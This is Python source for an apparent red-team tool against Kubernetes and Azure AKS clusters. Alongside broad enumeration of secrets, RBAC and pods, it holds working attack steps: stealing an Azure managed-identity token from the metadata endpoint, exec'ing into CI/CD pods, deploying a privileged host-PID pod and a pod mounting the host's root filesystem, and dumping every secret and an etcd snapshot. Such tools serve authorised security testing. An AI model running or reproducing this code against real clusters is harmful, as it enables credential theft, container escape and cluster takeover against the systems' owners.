import sys
import os
import re
import requests
from utils import print_header, print_good, print_warn, print_fail, output_csv

TOP_PORTS = [22, 80, 443, 8080, 8443, 53, 3306, 5432, 6379, 10250]

def get_kube_client():
    try:
        from kubernetes import client, config
        config.load_kube_config()
        print_good("[*] Loaded local kubeconfig")
    except Exception:
        from kubernetes import client, config
        config.load_incluster_config()
        print_good("[*] Loaded in-cluster config")
    return (
        client.CoreV1Api(),
        client.RbacAuthorizationV1Api(),
        client.AppsV1Api(),
        client.NetworkingV1Api(),
        client.PolicyV1Api()
    )

def get_namespaces(core, ns_arg):
    if ns_arg:
        try:
            core.read_namespace(ns_arg)
            return [ns_arg]
        except Exception:
            print_fail(f"Namespace '{ns_arg}' does not exist or not accessible.")
            sys.exit(1)
    else:
        return [ns.metadata.name for ns in core.list_namespace().items]

def list_namespaces(core, csvwriter=None):
    print_header("Namespaces")
    tbl = []
    try:
        nss = core.list_namespace()
        for ns in nss.items:
            print(ns.metadata.name)
            tbl.append([ns.metadata.name])
    except Exception as e:
        print_fail(f"Error listing namespaces: {e}")
    if csvwriter and tbl:
        output_csv([["Section: Namespaces"], ["Name"]] + tbl, csvwriter)

def list_nodes(core, csvwriter=None):
    from tabulate import tabulate
    print_header("Nodes")
    try:
        nodes = core.list_node()
        tbl = []
        for node in nodes.items:
            roles = ",".join([f"{k}={v}" for k,v in node.metadata.labels.items() if 'role' in k])
            kubelet_ver = node.status.node_info.kubelet_version
            internal_ip = next((a.address for a in node.status.addresses if a.type == "InternalIP"), "")
            external_ip = next((a.address for a in node.status.addresses if a.type == "ExternalIP"), "")
            tbl.append([node.metadata.name, roles, kubelet_ver, internal_ip, external_ip])
        print(tabulate(tbl, headers=["Node", "Roles", "Kubelet", "InternalIP", "ExternalIP"]))
        if csvwriter:
            output_csv([["Section: Nodes"], ["Node", "Roles", "Kubelet", "InternalIP", "ExternalIP"]] + tbl, csvwriter)
    except Exception as e:
        print_fail(f"Error listing nodes: {e}")

def list_pods(core, namespaces, csvwriter=None):
    from tabulate import tabulate
    print_header("Pods by Namespace")
    allrows = []
    for ns in namespaces:
        try:
            pods = core.list_namespaced_pod(ns)
            tbl = []
            for pod in pods.items:
                sa = pod.spec.service_account_name
                node = pod.spec.node_name
                pod_ip = pod.status.pod_ip
                containers = ','.join([c.name for c in pod.spec.containers])
                tbl.append([pod.metadata.name, sa, node, pod_ip, containers])
            if tbl:
                print(f"\nNamespace: {ns}")
                print(tabulate(tbl, headers=["Pod", "SA", "Node", "PodIP", "Containers"]))
                allrows.append(["Namespace: " + ns])
                allrows += [ ["Pod", "SA", "Node", "PodIP", "Containers"] ] + tbl + [[]]
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: Pods"]] + allrows, csvwriter)

def list_service_accounts(core, namespaces, csvwriter=None):
    print_header("Service Accounts")
    allrows = []
    for ns in namespaces:
        try:
            sas = core.list_namespaced_service_account(ns)
            for sa in sas.items:
                print(f"- {ns}: {sa.metadata.name}")
                allrows.append([ns, sa.metadata.name])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: Service Accounts"], ["Namespace", "Name"]] + allrows, csvwriter)

def list_secrets(core, namespaces, csvwriter=None):
    print_header("Secrets (type, size, contains suspicious keys)")
    allrows = []
    for ns in namespaces:
        try:
            secrets = core.list_namespaced_secret(ns)
            for sec in secrets.items:
                typ = sec.type
                name = sec.metadata.name
                suspicious = [k for k in (sec.data or {}) if any(x in k.lower() for x in ['token','password','key','secret','docker','github','azure'])]
                suspicious_str = ','.join(suspicious) if suspicious else ""
                if suspicious:
                    print_good(f"- {ns}: {name} [{typ}] Suspicious: {suspicious_str}")
                else:
                    print(f"- {ns}: {name} [{typ}]")
                allrows.append([ns, name, typ, suspicious_str])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: Secrets"], ["Namespace", "Name", "Type", "Suspicious Keys"]] + allrows, csvwriter)

def list_configmaps(core, namespaces, csvwriter=None):
    print_header("ConfigMaps (large values or with suspicious keys)")
    allrows = []
    for ns in namespaces:
        try:
            cms = core.list_namespaced_config_map(ns)
            for cm in cms.items:
                name = cm.metadata.name
                suspicious = [k for k in (cm.data or {}) if any(x in k.lower() for x in ['token','password','key','secret','config','github','azure','pipeline'])]
                suspicious_str = ','.join(suspicious) if suspicious else ""
                if suspicious:
                    print_good(f"- {ns}: {name} Suspicious: {suspicious_str}")
                else:
                    print(f"- {ns}: {name}")
                allrows.append([ns, name, suspicious_str])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: ConfigMaps"], ["Namespace", "Name", "Suspicious Keys"]] + allrows, csvwriter)

def list_roles_bindings(rbac, namespaces, csvwriter=None):
    print_header("RBAC: Roles, Bindings, ClusterRoles, ClusterRoleBindings")
    allrows = []
    for ns in namespaces:
        try:
            roles = rbac.list_namespaced_role(ns)
            for r in roles.items:
                print(f"- Role: {ns}/{r.metadata.name}")
                allrows.append(["Role", ns, r.metadata.name])
            bindings = rbac.list_namespaced_role_binding(ns)
            for b in bindings.items:
                print(f"- RoleBinding: {ns}/{b.metadata.name}")
                allrows.append(["RoleBinding", ns, b.metadata.name])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    try:
        croles = rbac.list_cluster_role()
        for r in croles.items:
            print(f"- ClusterRole: {r.metadata.name}")
            allrows.append(["ClusterRole", "", r.metadata.name])
        cbindings = rbac.list_cluster_role_binding()
        for b in cbindings.items:
            print(f"- ClusterRoleBinding: {b.metadata.name}")
            allrows.append(["ClusterRoleBinding", "", b.metadata.name])
    except Exception as e:
        print_fail(f"  Cluster-wide: {e}")
    if csvwriter and allrows:
        output_csv([["Section: RBAC"], ["Type", "Namespace", "Name"]] + allrows, csvwriter)

def can_i_recon(namespaces, csvwriter=None):
    print_header("RBAC: Can-I Checks")
    verbs = ["get", "list", "watch", "create", "delete", "update", "patch", "impersonate"]
    resources = [
        ("", "pods"), ("", "nodes"), ("", "secrets"), ("", "configmaps"),
        ("", "serviceaccounts"), ("", "namespaces"), ("", "deployments"), ("", "daemonsets"),
        ("", "networkpolicies"), ("", "persistentvolumeclaims")
    ]
    allrows = []
    for ns in namespaces:
        for api, res in resources:
            for verb in verbs:
                cmd = f"kubectl auth can-i {verb} {res} -n {ns}"
                out = os.popen(cmd).read().strip()
                if out == "yes":
                    print_good(f"[+] {cmd} => YES")
                    allrows.append([ns, verb, res, "YES"])
    # Cluster-wide
    for verb in verbs:
        for res in ["clusterroles", "clusterrolebindings", "nodes", "persistentvolumes"]:
            cmd = f"kubectl auth can-i {verb} {res} --all-namespaces"
            out = os.popen(cmd).read().strip()
            if out == "yes":
                print_good(f"[+] {cmd} => YES")
                allrows.append(["ALL", verb, res, "YES"])
    if csvwriter and allrows:
        output_csv([["Section: Can-I"], ["Namespace", "Verb", "Resource", "Allowed"]] + allrows, csvwriter)

def list_daemonsets(apps, namespaces, csvwriter=None):
    print_header("DaemonSets")
    allrows = []
    for ns in namespaces:
        try:
            dss = apps.list_namespaced_daemon_set(ns)
            for ds in dss.items:
                print(f"- {ns}: {ds.metadata.name}")
                allrows.append([ns, ds.metadata.name])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: DaemonSets"], ["Namespace", "Name"]] + allrows, csvwriter)

def list_deployments(apps, namespaces, csvwriter=None):
    print_header("Deployments")
    allrows = []
    for ns in namespaces:
        try:
            ds = apps.list_namespaced_deployment(ns)
            for d in ds.items:
                print(f"- {ns}: {d.metadata.name}")
                allrows.append([ns, d.metadata.name])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: Deployments"], ["Namespace", "Name"]] + allrows, csvwriter)

def list_pvcs(core, namespaces, csvwriter=None):
    print_header("PersistentVolumeClaims")
    allrows = []
    for ns in namespaces:
        try:
            pvcs = core.list_namespaced_persistent_volume_claim(ns)
            for pvc in pvcs.items:
                print(f"- {ns}: {pvc.metadata.name} [{pvc.status.phase}]")
                allrows.append([ns, pvc.metadata.name, pvc.status.phase])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: PVCs"], ["Namespace", "Name", "Phase"]] + allrows, csvwriter)

def list_network_policies(net, namespaces, csvwriter=None):
    print_header("NetworkPolicies")
    allrows = []
    for ns in namespaces:
        try:
            nps = net.list_namespaced_network_policy(ns)
            for np in nps.items:
                print(f"- {ns}: {np.metadata.name}")
                allrows.append([ns, np.metadata.name])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: NetworkPolicies"], ["Namespace", "Name"]] + allrows, csvwriter)

def list_pod_security_policies(psp, csvwriter=None):
    print_header("PodSecurityPolicies")
    allrows = []
    try:
        psps = psp.list_pod_security_policy()
        for p in psps.items:
            print(f"- {p.metadata.name}")
            allrows.append([p.metadata.name])
    except Exception as e:
        print_fail(f"  {e}")
    if csvwriter and allrows:
        output_csv([["Section: PodSecurityPolicies"], ["Name"]] + allrows, csvwriter)

def check_azure_metadata(csvwriter=None):
    print_header("Azure Metadata Endpoint Check")
    try:
        resp = requests.get("http://169.254.169.254/metadata/instance?api-version=2021-01-01", headers={"Metadata": "true"}, timeout=2)
        if resp.status_code == 200:
            print_good("[*] Azure Metadata service is accessible from this context")
            print(resp.text)
            if csvwriter:
                output_csv([["Section: AzureMetadata"], ["AzureMetadata"], [resp.text]], csvwriter)
        else:
            print_warn("[*] Azure Metadata service not accessible or returned error.")
            if csvwriter:
                output_csv([["Section: AzureMetadata"], ["Status"], ["Not accessible or error"]], csvwriter)
    except Exception as e:
        print_fail(f"Error: {e}")
        if csvwriter:
            output_csv([["Section: AzureMetadata"], ["Error"], [str(e)]], csvwriter)

def exec_into_pod(core, namespaces, csvwriter=None):
    print_header("Pod Exec Recon (privileged pods or CI/CD runners)")
    try:
        from kubernetes import stream
    except ImportError:
        print_fail("stream module is required from kubernetes")
        return
    allrows = []
    for ns in namespaces:
        try:
            pods = core.list_namespaced_pod(ns)
            for pod in pods.items:
                if pod.spec.service_account_name in ["default", "builder", "jenkins", "azure-pipelines"]:
                    name = pod.metadata.name
                    try:
                        resp = stream.stream(core.connect_get_namespaced_pod_exec, name, ns, command=["id"], stderr=True, stdin=False, stdout=True, tty=False)
                        print_good(f"{ns}/{name} (SA: {pod.spec.service_account_name}) => id: {resp.strip()}")
                        allrows.append([ns, name, pod.spec.service_account_name, resp.strip()])
                    except Exception as ee:
                        print_warn(f"  {ns}/{name}: Exec failed ({ee})")
                        allrows.append([ns, name, pod.spec.service_account_name, f"Exec failed: {ee}"])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: PodExec"], ["Namespace", "Pod", "ServiceAccount", "Result"]] + allrows, csvwriter)

def detect_cicd_secrets(core, namespaces, csvwriter=None):
    print_header("CI/CD Pipeline Secrets Detection")
    indicators = ['azure', 'devops', 'github', 'gitlab', 'jenkins', 'pipeline', 'ci', 'cd', 'build']
    allrows = []
    for ns in namespaces:
        try:
            secrets = core.list_namespaced_secret(ns)
            for sec in secrets.items:
                name = sec.metadata.name.lower()
                data = sec.data or {}
                suspicious = any(i in name for i in indicators) or any(any(i in k.lower() for i in indicators) for k in data)
                if suspicious:
                    print_good(f"- {ns}: {sec.metadata.name} Suspicious for CI/CD")
                    allrows.append([ns, sec.metadata.name, "Secret"])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
        try:
            cms = core.list_namespaced_config_map(ns)
            for cm in cms.items:
                name = cm.metadata.name.lower()
                data = cm.data or {}
                suspicious = any(i in name for i in indicators) or any(any(i in k.lower() for i in indicators) for k in data)
                if suspicious:
                    print_good(f"- {ns}: {cm.metadata.name} ConfigMap suspicious for CI/CD")
                    allrows.append([ns, cm.metadata.name, "ConfigMap"])
        except Exception as e:
            print_fail(f"  {ns}: {e}")
    if csvwriter and allrows:
        output_csv([["Section: CICDSecrets"], ["Namespace", "Name", "Type"]] + allrows, csvwriter)

def list_ips(core, namespaces, csvwriter=None):
    from tabulate import tabulate
    print_header("Node IP Addresses")
    nodes = core.list_node()
    node_tbl = []
    node_ips = []
    for node in nodes.items:
        name = node.metadata.name
        internal_ip = ""
        external_ip = ""
        for addr in node.status.addresses:
            if addr.type == "InternalIP":
                internal_ip = addr.address
                node_ips.append(internal_ip)
            if addr.type == "ExternalIP":
                external_ip = addr.address
        node_tbl.append([name, internal_ip, external_ip])
    print(tabulate(node_tbl, headers=["Node", "InternalIP", "ExternalIP"]))
    if csvwriter and node_tbl:
        output_csv([["Section: NodeIPs"], ["Node", "InternalIP", "ExternalIP"]] + node_tbl, csvwriter)

    print_header("Pod IP Addresses")
    all_pod_ips = []
    allrows = []
    for ns in namespaces:
        pods = core.list_namespaced_pod(ns)
        pod_tbl = []
        for pod in pods.items:
            name = pod.metadata.name
            ip = pod.status.pod_ip
            node = pod.spec.node_name
            if ip:
                pod_tbl.append([ns, name, ip, node])
                all_pod_ips.append(ip)
        if pod_tbl:
            print(tabulate(pod_tbl, headers=["Namespace", "Pod", "PodIP", "Node"]))
            allrows += pod_tbl
    if csvwriter and allrows:
        output_csv([["Section: PodIPs"], ["Namespace", "Pod", "PodIP", "Node"]] + allrows, csvwriter)
    return node_ips, all_pod_ips

def parse_container_services(pod):
    res = []
    for c in pod.spec.containers:
        image = c.image
        ports = [p.container_port for p in c.ports] if c.ports else []
        command = " ".join(c.command) if c.command else ""
        args = " ".join(c.args) if c.args else ""
        res.append({"image": image, "ports": ports, "command": command, "args": args})
    return res

def detect_pod_services(core, namespaces, csvwriter=None):
    from tabulate import tabulate
    print_header("Pod Services/Applications Detected From Spec")
    tbl = []
    for ns in namespaces:
        pods = core.list_namespaced_pod(ns)
        for pod in pods.items:
            pod_services = parse_container_services(pod)
            for svc in pod_services:
                tbl.append([
                    ns, pod.metadata.name, svc["image"],
                    ",".join(str(x) for x in svc["ports"]), svc["command"], svc["args"]
                ])
    if tbl:
        print(tabulate(tbl, headers=["Namespace", "Pod", "Image", "Ports", "Command", "Args"]))
    else:
        print_warn("No container app info found.")
    if csvwriter and tbl:
        output_csv([["Section: PodServices"], ["Namespace", "Pod", "Image", "Ports", "Command", "Args"]] + tbl, csvwriter)

def detect_node_services(core, csvwriter=None):
    print_header("Node Services/Applications (Kubelet/Components Only - API Level)")
    nodes = core.list_node()
    allrows = []
    for node in nodes.items:
        name = node.metadata.name
        kubelet_ver = node.status.node_info.kubelet_version
        print(f"Node: {name}, Kubelet: {kubelet_ver}")
        allrows.append([name, kubelet_ver])
    print("Actual service enumeration on nodes requires host/network access. See port scanning module for more.")
    if csvwriter and allrows:
        output_csv([["Section: NodeServices"], ["Node", "KubeletVersion"]] + allrows, csvwriter)

def scan_node_pod_ports(core, namespaces, csvwriter=None):
    from tabulate import tabulate
    from utils import scan_ports, TOP_PORTS
    print_header("Port Scan - Nodes")
    nodes = core.list_node()
    node_ips = []
    for node in nodes.items:
        for addr in node.status.addresses:
            if addr.type == "InternalIP":
                node_ips.append(addr.address)
    node_results = scan_ports(node_ips)
    tbl = [[ip, port, status, banner] for ip, port, status, banner in node_results if status == "open"]
    if tbl:
        print(tabulate(tbl, headers=["NodeIP", "Port", "Status", "Banner"]))
    else:
        print_warn("No open ports found on node IPs.")
    if csvwriter and tbl:
        output_csv([["Section: NodePortScan"], ["NodeIP", "Port", "Status", "Banner"]] + tbl, csvwriter)

    print_header("Port Scan - Pods")
    all_pod_ips = []
    for ns in namespaces:
        pods = core.list_namespaced_pod(ns)
        for pod in pods.items:
            if pod.status.pod_ip:
                all_pod_ips.append(pod.status.pod_ip)
    pod_results = scan_ports(all_pod_ips)
    tbl = [[ip, port, status, banner] for ip, port, status, banner in pod_results if status == "open"]
    if tbl:
        print(tabulate(tbl, headers=["PodIP", "Port", "Status", "Banner"]))
    else:
        print_warn("No open ports found on pod IPs.")
    if csvwriter and tbl:
        output_csv([["Section: PodPortScan"], ["PodIP", "Port", "Status", "Banner"]] + tbl, csvwriter)
def enumerate_mutating_webhooks():
    print_header("Mutating Webhook Configurations")
    try:
        from utils import run
        webhooks = run("kubectl get mutatingwebhookconfiguration", silent=True).splitlines()
        if len(webhooks) <= 1:
            print_warn("No MutatingWebhookConfigurations found.")
            return
        for line in webhooks[1:]:
            name = line.split()[0]
            print_good(f"Found webhook: {name} (manual patching/exploitation may be possible)")
    except Exception as e:
        print_fail(f"Error during webhook enumeration: {e}")
def enumerate_api_aggregation():
    print_header("API Aggregation Layer Enumeration")
    try:
        from utils import run
        apiservices = run("kubectl get apiservices", silent=True).splitlines()
        if len(apiservices) <= 1:
            print_warn("No APIService objects found.")
            return
        for line in apiservices[1:]:
            parts = line.split()
            name = parts[0]
            svc = parts[1] if len(parts) > 1 else "N/A"
            print_good(f"APIService: {name}   Service: {svc}")
    except Exception as e:
        print_fail(f"Error during API aggregation layer enumeration: {e}")
def enumerate_resource_quotas():
    print_header("Namespace Resource Quotas")
    try:
        from utils import run
        quotas = run("kubectl get resourcequotas --all-namespaces", silent=True)
        if not quotas.strip():
            print_warn("No resource quotas found.")
            return
        print(quotas)
        print_warn("Quota exhaustion attacks are environment-specific; manual testing recommended.")
    except Exception as e:
        print_fail(f"Error fetching resource quotas: {e}")
def detect_service_mesh_sidecars():
    print_header("Service Mesh Sidecar Detection")
    try:
        from utils import run
        pods = run("kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace} {.metadata.name} {.spec.containers[*].name}\\n{end}'", silent=True).splitlines()
        mesh_containers = ['istio-proxy', 'envoy', 'linkerd-proxy']
        found = []
        for line in pods:
            ns, pod, *containers = line.split()
            if any(mc in containers for mc in mesh_containers):
                found.append(f"{ns}/{pod} containers: {','.join(containers)}")
        if not found:
            print_warn("No common service mesh sidecars found.")
            return
        for f in found:
            print_good(f)
        print_warn("Check if sidecar admin/debug ports are exposed manually.")
    except Exception as e:
        print_fail(f"Error in service mesh sidecar detection: {e}")
def enumerate_k8s_events():
    print_header("Kubernetes Event Logs Enumeration")
    try:
        from utils import run
        events = run("kubectl get events --all-namespaces --sort-by='.lastTimestamp' --no-headers", silent=True)
        if not events.strip():
            print_warn("No events found.")
            return
        print_good("Recent cluster events (top 20):")
        print("\n".join(events.splitlines()[:20]))
    except Exception as e:
        print_fail(f"Error enumerating k8s events: {e}")
def detect_k8s_dashboard():
    print_header("Kubernetes Dashboard Detection")
    try:
        from utils import run
        svc_list = run("kubectl get svc --all-namespaces", silent=True).splitlines()
        dash_svcs = [line for line in svc_list if "dashboard" in line]
        if not dash_svcs:
            print_warn("No Kubernetes Dashboard service detected.")
            return
        for svc_line in dash_svcs:
            print_good(f"Dashboard service: {svc_line}")
        print_warn("Attempting unauthenticated access or default credentials is manual.")
    except Exception as e:
        print_fail(f"Error in dashboard detection: {e}")
def detect_prometheus_metrics():
    
    print_header("Prometheus / Metrics Services")
    try:
        from utils import run
        svc_list = run("kubectl get svc --all-namespaces", silent=True).splitlines()
        prom_svcs = [line for line in svc_list if re.search(r"prometheus|metrics", line, re.I)]
        if not prom_svcs:
            print_warn("No Prometheus/metrics services detected.")
            return
        for svc_line in prom_svcs:
            print_good(f"Metrics/Prometheus service: {svc_line}")
        print_warn("Manual review of scrape configs and metrics recommended.")
    except Exception as e:
        print_fail(f"Error in prometheus/metrics detection: {e}")
def detect_runtime_sockets():
    print_header("Container Runtime Socket Detection")
    try:
        from utils import run
        pods = run("kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace} {.metadata.name} {.spec.containers[*].name} {.spec.volumes[*].hostPath.path}\\n{end}'", silent=True).splitlines()
        suspicious = []
        for line in pods:
            parts = line.split()
            ns, pod = parts[0], parts[1]
            volumes = parts[3:] if len(parts) > 3 else []
            for v in volumes:
                if v and re.search(r"docker.sock|containerd.sock", v):
                    suspicious.append(f"{ns}/{pod} mounts {v}")
        if not suspicious:
            print_warn("No runtime sockets detected mounted in pods.")
            return
        for s in suspicious:
            print_good(s)
        print_warn("Manual runtime exploitation recommended based on findings.")
    except Exception as e:
        print_fail(f"Error in runtime socket detection: {e}")


def lateral_movement_surface():
    print_header("Network Policies & Lateral Movement Surface")
    try:
        from utils import run
        netpols = run("kubectl get netpol --all-namespaces", silent=True)
        if not netpols.strip():
            print_warn("No NetworkPolicies found - wide open pod communication likely.")
        else:
            print(netpols)
        pods_dns = run("kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace} {.metadata.name} {.spec.dnsPolicy}\\n{end}'", silent=True)
        print_good("Pod DNS Policies (namespace pod dnsPolicy):")
        print(pods_dns)
    except Exception as e:
        print_fail(f"Error in lateral movement surface: {e}")

def azure_cloud_priv_escalation():
    print_header("Cloud Provider Privilege Escalation")
    try:
        import requests
        from utils import run
        r = requests.get(
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            headers={"Metadata": "true"},
            timeout=3,
        )
        if r.ok:
            token = r.json().get("access_token")
            print_good(f"Azure Managed Identity token captured (len={len(token)})")
            try:
                sub = run("az account show --query id -o tsv", silent=True)
                if sub:
                    print_warn(f"Azure Subscription ID: {sub}")
                    print_warn("Attempting Azure ARM role assignment (manual step, see documentation).")
                else:
                    print_warn("Azure CLI not configured or no subscription found.")
            except Exception as e:
                print_warn(f"Azure CLI error: {e}")
        else:
            print_warn("Azure IMDS token not accessible or not returned.")
    except Exception as e:
        print_fail(f"Azure IMDS error: {e}")
def deploy_privileged_and_hostpath_pods():
    from utils import yaml_apply, print_header, print_good
    print_header("Deploying Privileged Pod and HostPath Pod")
    yaml_priv = """
apiVersion: v1
kind: Pod
metadata:
  name: ra-priv
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: p
    image: alpine
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c", "sleep 3600"]
"""
    yaml_hostpath = """
apiVersion: v1
kind: Pod
metadata:
  name: ra-hostpath
spec:
  containers:
  - name: h
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
"""
    print_good("[*] Deploying privileged pod...")
    yaml_apply(yaml_priv)
    print_good("[*] Deploying hostPath pod for host filesystem access...")
    yaml_apply(yaml_hostpath)
def enumerate_cicd_pipeline_files():
    from utils import print_header, print_good
    from pathlib import Path
    import re
    print_header("CI/CD Supply Chain Pipeline File Detection")
    for f in Path.cwd().rglob("*.y*ml"):
        if re.search(r"(pipeline|workflow|gitlab-ci|azure-pipelines)", f.name, re.I):
            print_good(f"Found pipeline file: {f.relative_to(Path.cwd())}")


def etcd_pod_and_data():
    from utils import run, print_header, print_good, print_warn
    import subprocess
    import time
    print_header("etcd Pod Detection & Sample Data Extraction")
    pod = run("kubectl -n kube-system get po -l component=etcd -o jsonpath='{.items[0].metadata.name}'", silent=True)
    if pod:
        print_good(f"etcd pod found: {pod}")
        pf = subprocess.Popen(f"kubectl -n kube-system port-forward {pod} 2379:2379", shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        time.sleep(3)
        sample = run("ETCDCTL_API=3 etcdctl --endpoints=localhost:2379 get / --prefix --keys-only | head -n 20")
        print_good("Sample etcd keys (top 20):")
        print(sample)
        pf.terminate()
    else:
        print_warn("etcd pod not found.")


def exfil_secrets_and_etcd():
    from utils import run, print_header, print_good, print_warn
    import subprocess
    import time
    from pathlib import Path
    OUT = Path("aks_red_team_output")
    secret_file = OUT / "secrets_dump.yaml"
    etcd_snap = OUT / "etcd_snapshot.snap"
    print_header("Exfiltration: Dump All Secrets and etcd Snapshot")
    print_good("[*] Dumping all secrets to local file...")
    run(f"kubectl get secrets -A -o yaml > {secret_file}")
    pod = run("kubectl -n kube-system get po -l component=etcd -o jsonpath='{.items[0].metadata.name}'", silent=True)
    if pod:
        print_good("[*] Taking etcd snapshot...")
        pf = subprocess.Popen(f"kubectl -n kube-system port-forward {pod} 2379:2379", shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        time.sleep(3)
        run(f"ETCDCTL_API=3 etcdctl snapshot save {etcd_snap} 2>/dev/null || true", silent=True)
        pf.terminate()
        print_good(f"etcd snapshot saved to {etcd_snap}")
    else:
        print_warn("etcd pod not found, skipping snapshot.")
def cleanup_red_team_artifacts():
    from utils import yaml_delete, print_header, print_good
    print_header("Cleanup Red Team Pods/Bindings/Artifacts")
    resources = [
        ("clusterrolebinding", "ra-pwn"),
        ("rolebinding", "ra-escalate"),
        ("clusterrolebinding", "ra-escalate"),
        ("serviceaccount", "ra-sa"),
        ("clusterrolebinding", "ra-sa-binding"),
        ("pod", "ra-priv"),
        ("pod", "ra-hostpath"),
        ("daemonset", "ra-ds"),
        ("cronjob", "ra-cj"),
        ("configmap", "ra-beacon-cm"),
    ]
    for kind, name in resources:
        print_good(f"Deleting {kind} {name}...")
        yaml_delete(kind, name)
